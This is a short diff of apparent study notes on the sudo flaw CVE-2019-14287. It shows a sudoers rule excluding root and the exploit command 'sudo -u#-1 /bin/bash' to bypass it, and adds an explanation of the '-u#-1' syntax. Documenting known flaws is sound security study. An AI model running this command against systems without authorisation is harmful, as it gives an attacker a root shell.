@@ -7,3 +7,6 @@ james ALL=(ALL,!root) /bin/bash
 To exploit this configuration, use the following command line:
 
 sudo -u#-1 /bin/bash
+----------------------------
+
+In the context of the command sudo -u#-1 /bin/bash, the string -u#-1 is a specific syntax used to exploit a high-severity security flaw (CVE-2019-14287) in older versions of the sudo utility
